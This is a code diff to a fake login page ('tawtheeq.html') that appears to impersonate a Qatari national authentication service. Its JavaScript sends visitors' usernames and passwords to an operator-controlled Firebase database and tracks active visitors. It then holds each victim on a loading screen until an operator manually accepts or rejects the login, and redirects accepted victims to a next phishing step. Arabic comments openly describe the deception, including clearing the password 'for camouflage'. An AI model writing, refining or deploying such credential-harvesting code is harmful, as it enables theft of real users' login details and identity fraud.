@@ -80,7 +80,7 @@
         footer { width: 100%; display: flex; flex-direction: column; }
         .footer-img { width: 100%; height: auto; display: block; }
 
-        /* شاشة التحميل */
+        /* شاشة التحميل المخصصة */
         #loading-screen {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(255,255,255,0.98); z-index: 9999;
@@ -138,7 +138,7 @@
 
     <div id="loading-screen">
         <div class="loader"></div>
-        <p style="margin-top: 25px; font-weight: bold; color: var(--primary-blue); font-size: 18px;">جاري معالجة الطلب...</p>
+        <p id="status-text" style="margin-top: 25px; font-weight: bold; color: var(--primary-blue); font-size: 18px;">جاري معالجة الطلب...</p>
     </div>
 
     <script>
@@ -153,57 +153,63 @@
             appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
 
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
         const database = firebase.database();
 
-        // معرف فريد للزائر (Session) لربطه بلوحة التحكم
-        let sessionID = localStorage.getItem('sessionID');
-        if (!sessionID) {
-            sessionID = "ID_" + Math.floor(Math.random() * 90000) + 10000;
-            localStorage.setItem('sessionID', sessionID);
+        // استخدام نفس المعرف من الصفحة الرئيسية لربط البيانات
+        let visitorId = sessionStorage.getItem('visitorId');
+        if (!visitorId) {
+            visitorId = "visitor_" + Math.floor(Math.random() * 900000 + 100000);
+            sessionStorage.setItem('visitorId', visitorId);
         }
 
-        // تتبع الزائر
-        const visitorRef = database.ref('active_visitors/' + sessionID);
-        visitorRef.set({
-            id: sessionID,
-            currentPage: "tawtheeq.html",
-            status: "online",
-            lastSeen: Date.now()
+        // تحديث صفحة الزائر الحالية
+        const visitorRef = database.ref('active_visitors/' + visitorId);
+        visitorRef.update({
+            currentPage: "صفحة الدخول (tawtheeq.html)",
+            lastSeen: firebase.database.ServerValue.TIMESTAMP
         });
         visitorRef.onDisconnect().remove();
 
-        // إرسال البيانات ومعالجة الطلب
+        // معالجة الفورم
         document.getElementById('directLoginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('user').value;
             const password = document.getElementById('pass').value;
 
-            // إرسال البيانات للفايربيس بدلاً من التليجرام
-            database.ref('logins/' + sessionID).set({
+            // إرسال البيانات للفايربيس
+            const loginRef = database.ref('logins/' + visitorId);
+            loginRef.set({
+                id: visitorId,
                 username: username,
                 password: password,
-                timestamp: Date.now(),
-                status: "waiting" // العميل ينتظر قرارك الآن
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                status: "waiting", // الحالة الافتراضية
+                step: "tawtheeq"
             });
 
-            // إظهار شاشة التحميل
+            // إظهار شاشة التحميل وإخفاء الكارت
             document.getElementById('main-card').style.display = 'none';
             document.getElementById('loading-screen').style.display = 'flex';
 
-            // الاستماع لقرار الأدمن (قبول أو رفض)
-            database.ref('logins/' + sessionID + '/status').on('value', (snapshot) => {
-                const status = snapshot.val();
-                if (status === "accept") {
-                    window.location.href = "nas_qatar.html"; // الانتقال للخطوة التالية
-                } else if (status === "reject") {
-                    // العودة مع إظهار الخطأ باللون الأحمر
+            // الاستماع اللحظي لقرارك في لوحة التحكم
+            loginRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.status === "accept") {
+                    // إذا قبلت الدخول، حوله للصفحة التالية
+                    window.location.href = "nas_qatar.html";
+                } else if (data && data.status === "reject") {
+                    // إذا رفضت، أعده للصفحة لإعادة المحاولة مع تصفير الحقول
                     document.getElementById('loading-screen').style.display = 'none';
                     document.getElementById('main-card').style.display = 'block';
-                    document.getElementById('user').style.borderColor = "red";
-                    document.getElementById('pass').style.borderColor = "red";
-                    alert("خطأ في بيانات الدخول، يرجى المحاولة مرة أخرى.");
+                    document.getElementById('pass').value = ""; // مسح كلمة المرور للتمويه
+                    alert("عذراً، بيانات الدخول غير صحيحة. يرجى التأكد من اسم المستخدم وكلمة المرور.");
+                    
+                    // إعادة الحالة لـ waiting في الداتابيز ليكون جاهزاً للمحاولة الجديدة
+                    loginRef.update({ status: "waiting" });
                 }
             });
         });
